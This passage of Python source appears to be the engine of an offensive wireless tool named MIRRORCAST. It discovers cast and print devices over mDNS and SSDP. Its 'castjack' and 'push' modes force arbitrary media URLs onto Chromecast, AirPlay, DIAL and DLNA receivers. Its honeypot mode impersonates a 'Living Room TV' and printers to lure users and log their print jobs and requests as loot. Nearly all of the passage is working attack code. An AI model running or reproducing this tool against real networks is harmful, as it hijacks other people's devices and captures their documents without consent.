    if "airplay" in s:
        return "airplay"
    if "raop" in s:
        return "raop"
    if "dial" in s:
        return "dial"
    if "ipp" in s or "printer" in s:
        return "printer"
    return "mdns"


def mdns_scan(ip, seconds, loot, iface=None):
    try:
        sock, bound = mdns_socket(ip, iface)
    except OSError as exc:
        loot.ui("mDNS scan disabled: %s" % exc)
        return []
    questions = [{"name": st, "type": DNS_PTR, "class": 0x8001} for st in SCAN_TYPES]
    query = build_dns(questions, [], flags=0x0000)
    deadline = time.time() + max(1, seconds)
    next_send = 0
    records = []
    while time.time() < deadline and not STOP.is_set():
        if time.time() >= next_send:
            mdns_send(sock, query)
            next_send = time.time() + 2.0
        try:
            data, addr = sock.recvfrom(9000)
        except socket.timeout:
            continue
        except OSError:
            break
        pkt = parse_dns(data)
        if not pkt:
            continue
        for ans in pkt["answers"]:
            ans["src"] = addr[0]
            records.append(ans)
    sock.close()
    return aggregate_mdns_records(records)


def aggregate_mdns_records(records):
    """Turn parsed mDNS answer records into cast/print device entries."""
    ptrs = {}
    srvs = {}
    txts = {}
    addrs = {}
    for rr in records:
        name = rr["name"]
        rtype = rr["type"]
        if rtype == DNS_PTR:
            target = rr_name(rr)
            ptrs.setdefault(name, set()).add(target)
        elif rtype == DNS_SRV:
            s = parse_srv(rr["rdata"], rr.get("raw"), rr.get("rdata_off", 0))
            if s:
                srvs[name] = s
        elif rtype == DNS_TXT:
            txts[name] = parse_txt(rr["rdata"])
        elif rtype == DNS_A and len(rr["rdata"]) == 4:
            addrs[name] = socket.inet_ntoa(rr["rdata"])

    out = []
    for service_type, instances in ptrs.items():
        if service_type == "_services._dns-sd._udp.local":
            continue
        kind = classify_service(service_type)
        for instance in instances:
            srv = srvs.get(instance)
            if not srv:
                continue
            target = srv["target"]
            host_ip = addrs.get(target)
            if not host_ip:
                for rr in records:
                    if rr["type"] == DNS_A and rr["name"] == target:
                        host_ip = socket.inet_ntoa(rr["rdata"])
                        break
            if not host_ip:
                # Last resort: use the source address of the SRV record.
                for rr in records:
                    if rr["type"] == DNS_SRV and rr["name"] == instance:
                        host_ip = rr.get("src")
                        break
            if not host_ip:
                continue
            txt = {}
            for item in txts.get(instance, []):
                if "=" in item:
                    k, v = item.split("=", 1)
                    txt[k] = v
            out.append({
                "type": kind,
                "source": "mdns",
                "service": service_type,
                "instance": instance,
                "name": txt.get("fn") or txt.get("ty") or instance.split(".")[0],
                "ip": host_ip,
                "port": srv["port"],
                "txt": txt,
            })
    return out


def ssdp_scan(ip, seconds, loot, iface=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    bind_to_device(sock, iface)
    try:
        sock.bind(("", 0))
    except OSError:
        sock.close()
        return []
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(ip))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    sock.settimeout(0.5)
    sts = ["ssdp:all",
           "urn:dial-multiscreen-org:service:dial:1",
           "urn:schemas-upnp-org:device:MediaRenderer:1",
           "urn:schemas-upnp-org:device:Printer:1"]
    deadline = time.time() + max(1, seconds)
    next_send = 0
    found = {}
    while time.time() < deadline and not STOP.is_set():
        if time.time() >= next_send:
            for st in sts:
                msg = ("M-SEARCH * HTTP/1.1\r\n"
                       "HOST: %s:%d\r\n"
                       "MAN: \"ssdp:discover\"\r\n"
                       "MX: 2\r\n"
                       "ST: %s\r\n"
                       "USER-AGENT: MirrorCast/%s\r\n\r\n" % (SSDP_ADDR, SSDP_PORT, st, VERSION))
                try:
                    sock.sendto(msg.encode("utf-8"), (SSDP_ADDR, SSDP_PORT))
                except OSError:
                    pass
            next_send = time.time() + 2.0
        try:
            data, addr = sock.recvfrom(9000)
        except socket.timeout:
            continue
        except OSError:
            break
        first, headers = parse_http_headers(data)
        if "200" not in first:
            continue
        usn = headers.get("usn") or headers.get("location") or ("%s:%s" % (addr[0], headers.get("st", "")))
        if usn in found:
            continue
        st = headers.get("st", "")
        location = headers.get("location", "")
        entry = {
            "type": "upnp",
            "source": "ssdp",
            "service": st,
            "ip": addr[0],
            "port": 80,
            "desc_url": location,
            "name": "",
            "usn": usn,
            "server": headers.get("server", ""),
        }
        if "dial" in st.lower():
            entry["type"] = "dial"
        elif "mediarenderer" in st.lower():
            entry["type"] = "dlna"
        elif "printer" in st.lower():
            entry["type"] = "printer"
        if location:
            try:
                _, host, port, _ = parse_url(location)
                entry["ip"] = host
                entry["port"] = port
            except Exception:
                pass
        found[usn] = entry
    sock.close()
    return list(found.values())


def enrich_description(entry, loot):
    url = entry.get("desc_url")
    if not url:
        return entry
    try:
        status, headers, body = http_request(url, timeout=4)
    except Exception:
        return entry
    if status != 200 or not body:
        return entry
    xml = decode_text(body, 262144)
    def grab(tag):
        m = re.search(r"<%s[^>]*>(.*?)</%s>" % (tag, tag), xml, re.I | re.S)
        return re.sub(r"<[^>]+>", "", m.group(1)).strip() if m else ""
    entry["name"] = grab("friendlyName") or entry.get("name") or ""
    entry["model"] = grab("modelName")
    entry["manufacturer"] = grab("manufacturer")
    entry["app_url"] = ""
    m = re.search(r"<Application-URL[^>]*>(.*?)</Application-URL>", xml, re.I | re.S)
    if m:
        entry["app_url"] = m.group(1).strip()
    entry["control_url"] = ""
    for block in re.findall(r"<service>(.*?)</service>", xml, re.I | re.S):
        if "AVTransport" in block:
            cm = re.search(r"<controlURL[^>]*>(.*?)</controlURL>", block, re.I | re.S)
            if cm:
                entry["control_url"] = cm.group(1).strip()
            break
    return entry


def scan_all(ip, seconds, loot, iface=None):
    results = []
    try:
        results.extend(mdns_scan(ip, seconds, loot, iface))
    except Exception as exc:
        loot.ui("mDNS scan error: %s" % exc)
    try:
        results.extend(ssdp_scan(ip, seconds, loot, iface))
    except Exception as exc:
        loot.ui("SSDP scan error: %s" % exc)

    # Deduplicate and enrich SSDP entries.
    unique = {}
    for entry in results:
        entry = enrich_description(entry, loot) if entry.get("source") == "ssdp" else entry
        key = (entry.get("type"), entry.get("ip"), entry.get("port"))
        if key not in unique:
            unique[key] = entry
    return list(unique.values())


def format_target(entry):
    name = entry.get("name") or entry.get("instance") or ""
    return "[%-10s] %-15s :%-5s %s" % (
        entry.get("type", "?"), entry.get("ip", "?"),
        entry.get("port", "?"), name[:48])


# ---------------------------------------------------------------------------
# castjack
# ---------------------------------------------------------------------------

def airplay_play(ip, port, url):
    headers = {
        "Content-Location": url,
        "Start-Position": "0.0",
        "User-Agent": "MediaControl/1.0",
        "X-Apple-ProtocolVersion": "1",
    }
    status, hdrs, body = http_request("http://%s:%d/play" % (ip, port),
                                      method="POST", body=b"", headers=headers,
                                      timeout=6)
    return {"status": status, "headers": hdrs, "body": decode_text(body, 512)}


def dial_launch(ip, port, app, url, app_url=""):
    if not app_url:
        app_url = "http://%s:%d/apps" % (ip, port)
    target = app_url.rstrip("/") + "/" + app.strip("/")
    body = "<launch><url>%s</url></launch>" % url
    for ctype in ("text/plain; charset=\"utf-8\"", "application/xml"):
        try:
            status, hdrs, resp = http_request(target, method="POST", body=body.encode("utf-8"),
                                              headers={"Content-Type": ctype}, timeout=6)
            if 200 <= status < 300:
                return {"status": status, "headers": hdrs, "body": decode_text(resp, 512)}
        except Exception as exc:
            last = str(exc)
    return {"status": 0, "error": "DIAL launch failed"}


def dlna_play(ip, port, url, control_url=""):
    if not control_url:
        return {"status": 0, "error": "no AVTransport control URL"}
    if control_url.startswith("http://") or control_url.startswith("https://"):
        target = control_url
    else:
        target = "http://%s:%d%s" % (ip, port, control_url if control_url.startswith("/") else "/" + control_url)
    envelope = ("""<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
 s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
<InstanceID>0</InstanceID>
<CurrentURI>%s</CurrentURI>
<CurrentURIMetaData></CurrentURIMetaData>
</u:SetAVTransportURI>
</s:Body></s:Envelope>""" % url)
    status, hdrs, body = http_request(target, method="POST", body=envelope.encode("utf-8"),
                                      headers={"Content-Type": "text/xml; charset=\"utf-8\"",
                                               "SOAPACTION": "\"urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI\""},
                                      timeout=6)
    if not (200 <= status < 300):
        return {"status": status, "body": decode_text(body, 512)}
    play = ("""<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
 s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:Play xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
<InstanceID>0</InstanceID><Speed>1</Speed>
</u:Play>
</s:Body></s:Envelope>""")
    status2, hdrs2, body2 = http_request(target, method="POST", body=play.encode("utf-8"),
                                         headers={"Content-Type": "text/xml; charset=\"utf-8\"",
                                                  "SOAPACTION": "\"urn:schemas-upnp-org:service:AVTransport:1#Play\""},
                                         timeout=6)
    return {"status": status, "play_status": status2,
            "body": decode_text(body, 512), "play_body": decode_text(body2, 256)}


# -- CASTV2 protobuf ---------------------------------------------------------

def enc_varint(n):
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def enc_field_string(field, value):
    b = value.encode("utf-8")
    return bytes([(field << 3) | 2]) + enc_varint(len(b)) + b


def enc_cast_message(source, dest, namespace, payload):
    out = bytearray()
    out += b"\x08\x00"  # protocol_version = 0
    out += enc_field_string(2, source)
    out += enc_field_string(3, dest)
    out += enc_field_string(4, namespace)
    out += b"\x28\x00"  # payload_type = STRING
    out += enc_field_string(6, payload)
    return bytes(out)


def read_varint(data, off):
    shift = 0
    value = 0
    while off < len(data):
        b = data[off]
        off += 1
        value |= (b & 0x7F) << shift
        if not (b & 0x80):
            break
        shift += 7
        if shift > 63:
            break
    return value, off


def parse_cast_message(data):
    fields = {}
    off = 0
    while off < len(data):
        key, off = read_varint(data, off)
        field = key >> 3
        wire = key & 7
        if wire == 0:
            value, off = read_varint(data, off)
        elif wire == 2:
            ln, off = read_varint(data, off)
            value = data[off:off + ln]
            off += ln
        elif wire == 5:
            value = data[off:off + 4]
            off += 4
        elif wire == 1:
            value = data[off:off + 8]
            off += 8
        else:
            break
        fields[field] = value
    return {
        "source": fields.get(2, b"").decode("utf-8", "replace"),
        "dest": fields.get(3, b"").decode("utf-8", "replace"),
        "namespace": fields.get(4, b"").decode("utf-8", "replace"),
        "payload": fields.get(6, b"").decode("utf-8", "replace"),
    }


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def recv_cast(sock):
    hdr = recv_exact(sock, 4)
    if not hdr:
        return None
    length = struct.unpack(">I", hdr)[0]
    if length <= 0 or length > 8 * 1024 * 1024:
        return None
    data = recv_exact(sock, length)
    if not data:
        return None
    return parse_cast_message(data)


def send_cast(sock, source, dest, namespace, payload):
    msg = enc_cast_message(source, dest, namespace, json.dumps(payload))
    sock.sendall(struct.pack(">I", len(msg)) + msg)


def castv2_play(ip, port, url, content_type="video/mp4"):
    try:
        import ssl
    except Exception as exc:
        return {"status": 0, "error": "ssl module unavailable: %s" % exc}
    raw = socket.create_connection((ip, port), timeout=6)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(raw, server_hostname=ip)
    sock.settimeout(3)
    try:
        send_cast(sock, "sender-0", "receiver-0", CONNECTION_NS, {"type": "CONNECT"})
        send_cast(sock, "sender-0", "receiver-0", RECEIVER_NS,
                  {"type": "GET_STATUS", "requestId": 1})
        transport = None
        launched = False
        deadline = time.time() + 7
        while time.time() < deadline and not transport:
            msg = recv_cast(sock)
            if not msg:
                break
            if msg["namespace"] != RECEIVER_NS or not msg["payload"]:
                continue
            try:
                obj = json.loads(msg["payload"])
            except Exception:
                continue
            if obj.get("type") != "RECEIVER_STATUS":
                continue
            apps = obj.get("status", {}).get("applications", [])
            if apps:
                transport = apps[0].get("transportId")
                break
            if not launched:
                send_cast(sock, "sender-0", "receiver-0", RECEIVER_NS,
                          {"type": "LAUNCH", "appId": DEFAULT_MEDIA_RECEIVER,
                           "requestId": 2})
                launched = True
        if not transport:
            return {"status": 0, "error": "no transportId from receiver"}
        send_cast(sock, "sender-0", transport, CONNECTION_NS, {"type": "CONNECT"})
        send_cast(sock, "sender-0", transport, MEDIA_NS, {
            "type": "LOAD",
            "requestId": 3,
            "media": {
                "contentId": url,
                "streamType": "BUFFERED",
                "contentType": content_type,
            },
        })
        # Give the receiver a moment and capture the media status.
        result = {"status": 1, "transport": transport, "media": []}
        end = time.time() + 3
        while time.time() < end:
            msg = recv_cast(sock)
            if not msg:
                break
            if msg["namespace"] == MEDIA_NS and msg["payload"]:
                result["media"].append(msg["payload"][:512])
        return result
    finally:
        try:
            sock.close()
        except OSError:
            pass


def guess_content_type(url):
    low = url.lower().split("?", 1)[0]
    if low.endswith((".mp3", ".m4a", ".aac", ".wav", ".ogg")):
        return "audio/mpeg"
    if low.endswith((".m3u8",)):
        return "application/x-mpegURL"
    if low.endswith((".jpg", ".jpeg")):
        return "image/jpeg"
    if low.endswith((".png",)):
        return "image/png"
    if low.endswith((".mp4", ".m4v", ".mov")):
        return "video/mp4"
    return "video/mp4"


# ---------------------------------------------------------------------------
# modes
# ---------------------------------------------------------------------------

def build_services(ip, host, name, device_id, http_port, airplay_port, ipp_port):
    txt_cast = [
        "id=%s" % device_id,
        "md=Chromecast",
        "fn=%s" % name,
        "ve=05",
        "rs=MirrorCast",
    ]
    txt_airplay = [
        "deviceid=%s" % device_id,
        "features=0x5A7FFFF7,0x1E",
        "flags=0x4",
        "model=AppleTV3,2",
        "srcvers=220.68",
        "vv=2",
    ]
    txt_raop = [
        "ch=2", "cn=0,1,2,3", "et=0,3,5", "sv=false", "tp=UDP",
        "vn=65537", "vs=220.68", "sf=0x4", "md=0,1,2", "pw=false",
    ]
    txt_ipp = [
        "txtvers=1", "qtotal=1", "rp=ipp/print", "ty=%s" % name,
        "pdl=application/pdf,image/jpeg,image/png,text/plain",
        "product=(MirrorCast)", "note=MirrorCast",
    ]
    return [
        {"type": "_googlecast._tcp.local", "instance": "%s._googlecast._tcp.local" % name,
         "host": host, "port": CASTV2_PORT, "txt": txt_cast},
        {"type": "_airplay._tcp.local", "instance": "%s._airplay._tcp.local" % name,
         "host": host, "port": airplay_port, "txt": txt_airplay},
        {"type": "_raop._tcp.local", "instance": "%s@%s._raop._tcp.local" % (device_id, name),
         "host": host, "port": RAOP_PORT, "txt": txt_raop},
        {"type": "_ipp._tcp.local", "instance": "%s._ipp._tcp.local" % name,
         "host": host, "port": ipp_port, "txt": txt_ipp},
        {"type": "_ipps._tcp.local", "instance": "%s._ipps._tcp.local" % name,
         "host": host, "port": ipp_port, "txt": txt_ipp},
        {"type": "_printer._tcp.local", "instance": "%s._printer._tcp.local" % name,
         "host": host, "port": ipp_port, "txt": ["txtvers=1", "rp=ipp/print", "ty=%s" % name]},
        {"type": "_dial._tcp.local", "instance": "%s._dial._tcp.local" % name,
         "host": host, "port": http_port, "txt": ["txtvers=1", "path=/apps"]},
    ]


def mode_honeypot(args):
    ip = interface_ip(args.iface)
    loot = Loot(args.loot)
    mac = get_iface_mac(args.iface) or make_mac()
    device_id = mac.replace(":", "").lower()
    uuid = make_uuid()
    name = args.name or "Living Room TV"
    host = "mirrorcast-%s.local" % random_hex(3)
    http_port = args.http_port
    airplay_port = AIRPLAY_PORT if args.bind_defaults else http_port
    ipp_port = IPP_PORT if args.bind_defaults else http_port

    lure_html = LURE_HTML
    lure_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "lure.html")
    if os.path.isfile(lure_path):
        try:
            with open(lure_path, "r", encoding="utf-8", errors="replace") as f:
                lure_html = f.read()
        except OSError:
            pass

    services = build_services(ip, host, name, device_id, http_port, airplay_port, ipp_port)
    loot.ui("MIRRORCAST honeypot on %s (%s)" % (ip, args.iface))
    loot.ui("Advertising as '%s' uuid=%s" % (name, uuid))

    servers = []
    threads = []
    ports = [http_port]
    if args.bind_defaults:
        for p in (AIRPLAY_PORT, IPP_PORT):
            if p not in ports:
                ports.append(p)
    for p in ports:
        srv = start_http_server(p, loot, ip, uuid, name, lure_html, http_port)
        if srv:
            servers.append(srv)
    for p, label in ((RAOP_PORT, "RAOP"), (CASTV2_PORT, "Chromecast")):
        t = threading.Thread(target=tcp_logger, args=(ip, p, label, loot), daemon=True)
        t.start()
        threads.append(t)
    t = threading.Thread(target=mdns_responder,
                         args=(ip, host, services, loot, args.iface), daemon=True)
    t.start()
    threads.append(t)
    t = threading.Thread(target=ssdp_responder,
                         args=(ip, http_port, uuid, loot, args.iface), daemon=True)
    t.start()
    threads.append(t)

    print("MIRRORCAST honeypot active. Loot: %s" % loot.path, flush=True)
    deadline = time.time() + args.duration if args.duration > 0 else None
    try:
        while not STOP.is_set():
            if deadline and time.time() >= deadline:
                break
            time.sleep(0.3)
    except KeyboardInterrupt:
        pass
    STOP.set()
    for srv in servers:
        try:
            srv.shutdown()
            srv.server_close()
        except Exception:
            pass
    for t in threads:
        t.join(timeout=2)
    loot.ui("Honeypot stopped.")
    events = json_lines(loot.events_path)
    prints = sum(1 for e in events if e.get("kind") == "printjob")
    http_events = sum(1 for e in events if e.get("kind") == "http")
    print("Summary: %d HTTP events, %d print jobs. Loot: %s" % (http_events, prints, loot.path), flush=True)


def mode_scan(args):
    ip = interface_ip(args.iface)
    loot = Loot(args.loot, quiet=args.json)
    if not args.json:
        print("Scanning on %s (%s) for %d seconds..." % (ip, args.iface, args.seconds), flush=True)
    targets = scan_all(ip, args.seconds, loot, args.iface)
    out_path = os.path.join(loot.path, "scan_%s.json" % time.strftime("%Y%m%d_%H%M%S"))
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(targets, f, indent=2)
    if args.json:
        print(json.dumps(targets, indent=2), flush=True)
    else:
        if not targets:
            print("No cast devices found.", flush=True)
        for entry in sorted(targets, key=lambda e: (e.get("type", ""), e.get("ip", ""))):
            print(format_target(entry), flush=True)
            extra = []
            if entry.get("app_url"):
                extra.append("app_url=%s" % entry["app_url"])
            if entry.get("control_url"):
                extra.append("control=%s" % entry["control_url"])
            if entry.get("txt"):
                idv = entry["txt"].get("id") or entry["txt"].get("deviceid")
                if idv:
                    extra.append("id=%s" % idv)
            if extra:
                print("             " + "  ".join(extra), flush=True)
        print("Saved: %s" % out_path, flush=True)
    return targets


def push_entry(entry, args):
    """Push args.url at one discovered (or manually supplied) target."""
    kind = entry.get("type")
    target_ip = entry.get("ip")
    port = safe_int(entry.get("port"), 0)
    if args.dry_run:
        return {"status": 0, "dry_run": True,
                "would_send": kind, "ip": target_ip, "port": port}
    try:
        if kind == "chromecast":
            return castv2_play(target_ip, port or CASTV2_PORT, args.url,
                               args.content_type or guess_content_type(args.url))
        if kind == "airplay":
            return airplay_play(target_ip, port or AIRPLAY_PORT, args.url)
        if kind == "dial":
            return dial_launch(target_ip, port or 80, args.app, args.url,
                               entry.get("app_url", ""))
        if kind == "dlna":
            return dlna_play(target_ip, port or 80, args.url,
                             entry.get("control_url", ""))
        return {"status": 0, "error": "unsupported type"}
    except Exception as exc:
        return {"status": 0, "error": str(exc)}


def mode_castjack(args):
    ip = interface_ip(args.iface)
    loot = Loot(args.loot)
    print("Discovering targets on %s for %d seconds..." % (ip, args.seconds), flush=True)
    targets = scan_all(ip, args.seconds, loot, args.iface)
    if args.target:
        targets = [t for t in targets if t.get("ip") == args.target]
    if args.type and args.type != "auto":
        targets = [t for t in targets if t.get("type") == args.type]
    if not targets:
        print("No matching devices found.", flush=True)
        return
    log_path = os.path.join(loot.path, "castjack_%s.log" % time.strftime("%Y%m%d_%H%M%S"))
    with open(log_path, "a", encoding="utf-8") as logf:
        def emit(line):
            print(line, flush=True)
            logf.write(line + "\n")
            logf.flush()
        emit("URL: %s" % args.url)
        for entry in targets:
            emit("--> %s" % format_target(entry))
            res = push_entry(entry, args)
            emit("    result: %s" % json.dumps(res)[:600])
            loot.event("castjack", target=entry, url=args.url, result=res)
    print("Castjack log: %s" % log_path, flush=True)


def mode_push(args):
    """Push to one target that the payload already discovered."""
    ip = interface_ip(args.iface)
    loot = Loot(args.loot)
    entry = {
        "type": args.type,
        "source": "payload",
        "ip": args.target,
        "port": args.port,
        "name": args.name or "",
        "app_url": args.app_url,
        "control_url": args.control_url,
    }
    print("Pushing to %s" % format_target(entry), flush=True)
    res = push_entry(entry, args)
    print("Result: %s" % json.dumps(res)[:1000], flush=True)
    loot.event("castjack", target=entry, url=args.url, result=res)
    log_path = os.path.join(loot.path, "castjack_%s.log" % time.strftime("%Y%m%d_%H%M%S"))
    try:
        with open(log_path, "a", encoding="utf-8") as f:
            f.write("URL: %s\n" % args.url)
            f.write("--> %s\n" % format_target(entry))
            f.write("    result: %s\n" % json.dumps(res))
    except OSError:
        pass
    print("Castjack log: %s" % log_path, flush=True)
    return 0 if (res.get("status") or res.get("dry_run")) else 1


# ---------------------------------------------------------------------------
# entry point
# ---------------------------------------------------------------------------

def add_common(parser):
    parser.add_argument("--iface", default="wlan0open", help="interface to use")
    parser.add_argument("--loot", default="/root/loot/mirrorcast", help="loot directory")


def main():
    parser = argparse.ArgumentParser(description="MIRRORCAST engine")
    sub = parser.add_subparsers(dest="mode")

    p_if = sub.add_parser("ifaces", help="list interfaces with IPv4 addresses")

    p_h = sub.add_parser("honeypot", help="start the cast/print honeypot")
    add_common(p_h)
    p_h.add_argument("--http-port", type=int, default=8080)
    p_h.add_argument("--bind-defaults", action="store_true",
                     help="also bind 7000/631 and advertise those ports")
    p_h.add_argument("--name", default="Living Room TV")
    p_h.add_argument("--duration", type=int, default=0,
                     help="seconds to run (0 = until stopped)")

    p_s = sub.add_parser("scan", help="discover cast devices")
    add_common(p_s)
    p_s.add_argument("--seconds", type=int, default=20)
    p_s.add_argument("--json", action="store_true")

    p_c = sub.add_parser("castjack", help="push a media URL to discovered devices")
    add_common(p_c)
    p_c.add_argument("--url", required=True)
    p_c.add_argument("--seconds", type=int, default=20)
    p_c.add_argument("--type", default="auto",
                     choices=["auto", "chromecast", "airplay", "dial", "dlna"])
    p_c.add_argument("--app", default="Browser", help="DIAL app name (default Browser)")
    p_c.add_argument("--content-type", default="", help="override media content type")
    p_c.add_argument("--target", default="", help="only this IP")
    p_c.add_argument("--dry-run", action="store_true")

    p_p = sub.add_parser("push", help="push to one already-discovered target")
    add_common(p_p)
    p_p.add_argument("--url", required=True)
    p_p.add_argument("--target", required=True)
    p_p.add_argument("--type", required=True,
                     choices=["chromecast", "airplay", "dial", "dlna"])
    p_p.add_argument("--port", type=int, default=0)
    p_p.add_argument("--name", default="")
    p_p.add_argument("--app", default="Browser")
    p_p.add_argument("--app-url", default="")
    p_p.add_argument("--control-url", default="")
    p_p.add_argument("--content-type", default="")
    p_p.add_argument("--dry-run", action="store_true")

    args = parser.parse_args()

    def on_signal(signum, frame):
        STOP.set()

    signal.signal(signal.SIGINT, on_signal)
    signal.signal(signal.SIGTERM, on_signal)

    if args.mode == "ifaces":
        for name, ip in iface_list():
            print("%s\t%s" % (name, ip))
        return
    if args.mode == "honeypot":
        mode_honeypot(args)
    elif args.mode == "scan":
        mode_scan(args)
    elif args.mode == "castjack":
        mode_castjack(args)
    elif args.mode == "push":
        sys.exit(mode_push(args))
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
